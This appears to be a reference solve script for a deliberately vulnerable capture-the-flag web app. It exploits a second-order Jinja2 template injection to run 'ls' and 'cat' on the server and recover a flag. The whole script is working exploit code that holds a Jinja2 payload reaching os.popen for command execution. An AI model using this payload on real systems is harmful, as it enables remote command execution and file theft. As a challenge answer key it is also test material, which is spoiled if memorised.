// Reference solve — Postcard, Inquisitor. /preview no longer renders the saved message: it returns a draft id in
// data-draft and a link to the print stage. The print proof renders that saved message as a Jinja2 template (the
// second-order sink). The flag now lives in a random pair under /tmp/postcard/archive/<random>, not at the Acolyte
// path: list the archive, then join each candidate pair and keep the only one that forms a valid HVWA{...}.
// Implementer-supplied; the plan hard-codes no payload by design.
const base = process.argv[2];

async function save(message) {
  const res = await fetch(`${base}/preview`, {
    method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ style: 'Birthday', message }),
  });
  const draft = (await res.text()).match(/data-draft="([A-Za-z0-9_-]+)"/);
  if (!draft) process.exit(0);
  return (await fetch(`${base}/orders/${draft[1]}/print`)).text();
}

const listing = await save("{{ config.__class__.__init__.__globals__.os.popen('ls -R /tmp/postcard/archive').read() }}");
const dir = /\/tmp\/postcard\/archive\/[a-f0-9]{8}/.exec(listing)?.[0];
if (!dir) process.exit(0);
const tokens = [...new Set([...listing.matchAll(/part-[12]-([a-f0-9]{8})/g)].map((m) => m[1]))];
for (const token of tokens) {
  const payload = "{{ config.__class__.__init__.__globals__.os.popen('cat "
    + `${dir}/part-1-${token} ${dir}/part-2-${token}` + "').read() }}";
  const m = (await save(payload)).match(/HVWA\{[a-z2-7]{26}\}/);
  if (m) { console.log(m[0]); break; }
}
